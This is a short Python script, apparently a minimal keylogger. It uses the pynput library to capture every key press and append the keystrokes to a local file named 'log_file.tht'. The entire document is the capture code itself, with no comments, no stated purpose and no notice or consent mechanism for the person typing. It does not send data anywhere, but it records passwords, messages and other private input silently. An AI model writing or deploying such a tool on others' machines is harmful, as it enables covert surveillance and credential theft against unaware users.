from pynput.keyboard import Listener


def write_to_file(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")

    with open('log_file.tht', 'a') as f:
        f.write(key_data)


with Listener(on_press=write_to_file) as l:
    l.join()
